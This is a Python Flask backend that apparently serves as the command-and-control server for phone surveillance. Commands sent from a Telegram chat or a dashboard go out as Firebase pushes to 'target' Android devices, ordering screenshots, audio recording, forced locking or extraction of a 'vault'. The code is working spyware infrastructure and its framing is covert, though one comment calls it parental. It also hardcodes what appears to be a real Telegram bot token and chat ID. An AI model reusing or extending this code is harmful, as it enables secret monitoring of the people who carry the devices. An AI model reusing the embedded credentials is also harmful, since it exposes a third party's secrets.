import os
import requests
from flask import Blueprint, request, jsonify
from backend.auth import token_required
from backend.devices import verify_device_access
from database import supabase
from firebase_admin import messaging, exceptions

ops_bp = Blueprint('ops', __name__)

# 🚀 MASTER TELEGRAM CREDENTIALS
TELEGRAM_BOT_TOKEN = "8859136669:AAGRxFrz6biRm0668zMo9Zhi8r5M2BdsX9A"
AUTHORIZED_CHAT_ID = 310530365

def send_telegram_reply(text):
    """Helper function to send status back to your Telegram chat."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": AUTHORIZED_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"[TELEGRAM API] Reply failed: {e}")

# =========================================================================
# 🚀 1. TELEGRAM WEBHOOK COMMAND LISTENER (The New Control Hub)
# =========================================================================
@ops_bp.route('/api/telegram/webhook', methods=['POST'])
def telegram_webhook():
    """
    Listens for commands directly from the Telegram Bot and fires FCM pushes.
    """
    data = request.json or {}
    message = data.get('message', {})
    chat_id = message.get('chat', {}).get('id')
    text = message.get('text', '').strip().lower()

    # 🛡️ SECURITY: Strict authorization. Drop if not from parent's Chat ID.
    if chat_id != AUTHORIZED_CHAT_ID:
        return jsonify({"status": "ignored"}), 200

    if not text.startswith('/'):
        return jsonify({"status": "ok"}), 200

    # ⚙️ COMMAND PARSER
    action_payload = ""
    command_parts = text.split()
    base_command = command_parts[0]

    if base_command == "/screenshot":
        action_payload = "TAKE_SCREENSHOT"
    elif base_command == "/record":
        duration = command_parts[1] if len(command_parts) > 1 else "60"
        action_payload = f"RECORD_AUDIO:{duration}"
    elif base_command == "/lock":
        action_payload = "FORCE_LOCK"
    elif base_command == "/extract":
        action_payload = "EXTRACT_VAULT"
    else:
        send_telegram_reply("⚠️ *Unknown Command.*\nTry: `/screenshot`, `/record 60`, `/lock`")
        return jsonify({"status": "ok"}), 200

    # 📡 FIRE THE FCM PUSH
    try:
        # Get the most recently active device (for single-target control via Telegram)
        dev_query = supabase.table('devices').select('device_token, name').order('last_active', desc=True).limit(1).execute()
        
        if not dev_query.data or not dev_query.data[0].get('device_token'):
            send_telegram_reply("❌ *Error:* No active target devices found in Supabase.")
            return jsonify({"status": "ok"}), 200
            
        target_fcm_token = dev_query.data[0]['device_token']
        device_name = dev_query.data[0].get('name', 'Target Device')

        fcm_message = messaging.Message(
            data={'command': action_payload},
            token=target_fcm_token,
            android=messaging.AndroidConfig(priority='high')
        )

        response = messaging.send(fcm_message)
        print(f"[TACTICAL OPS] Telegram invoked '{action_payload}' to {device_name}.", flush=True)
        
        # Acknowledge back to Telegram
        send_telegram_reply(f"⚡ *Command Dispatched: {action_payload}*\nTarget: `{device_name}`\nAwaiting payload drop...")

    except Exception as e:
        print(f"[WEBHOOK CRASH] {str(e)}", flush=True)
        send_telegram_reply(f"❌ *FCM Dispatch Failed:* {str(e)}")

    return jsonify({"status": "ok"}), 200


# =========================================================================
# 🚀 2. STANDARD DASHBOARD DISPATCHER (For UI operations)
# =========================================================================
@ops_bp.route('/api/devices/<device_id>/action', methods=['POST'])
@token_required
def dispatch_tactical_command(device_id):
    if not verify_device_access(request.owner_id, device_id):
        return jsonify({"status": "error", "message": "Access permission denied for this target."}), 403

    data = request.json or {}
    action = data.get('action')

    if not action:
        return jsonify({"status": "error", "message": "Command payload missing."}), 400

    try:
        dev_query = supabase.table('devices').select('device_token, name').eq('id', device_id).execute()
        
        if not dev_query.data or not dev_query.data[0].get('device_token'):
            return jsonify({"status": "error", "message": "Target FCM token missing."}), 404
            
        target_fcm_token = dev_query.data[0]['device_token']
        device_name = dev_query.data[0].get('name', 'Unknown Device')

        message = messaging.Message(
            data={'command': action},
            token=target_fcm_token,
            android=messaging.AndroidConfig(priority='high')
        )

        response = messaging.send(message)
        print(f"[TACTICAL OPS] Command '{action}' successfully injected. Message ID: {response}", flush=True)

        supabase.table('activity_logs').insert({
            "device_id": device_id,
            "event_type": "Tactical Command Dispatched",
            "description": f"Executed zero-lag command: {action}"
        }).execute()

        return jsonify({
            "status": "success", 
            "message": f"Payload delivered via FCM pipeline.",
            "message_id": response
        }), 200

    except exceptions.FirebaseError as fcm_err:
        print(f"[FCM CRASH] Firebase routing failed: {fcm_err}", flush=True)
        if "registration-token-not-registered" in str(fcm_err):
             return jsonify({"status": "error", "message": "FCM Token expired."}), 410
        return jsonify({"status": "error", "message": f"FCM failure: {str(fcm_err)}"}), 502
    except Exception as e:
        print(f"[OPS SYSTEM CRASH] {str(e)}", flush=True)
        return jsonify({"status": "error", "message": "Internal command router anomaly."}), 500

# =================================================================================
# 🚀 3. LEGACY POLLING ROUTES (Truncated for clean architecture)
# =================================================================================
# Removed legacy GET/POST queues since the architecture is now 100% FCM + Telegram based.
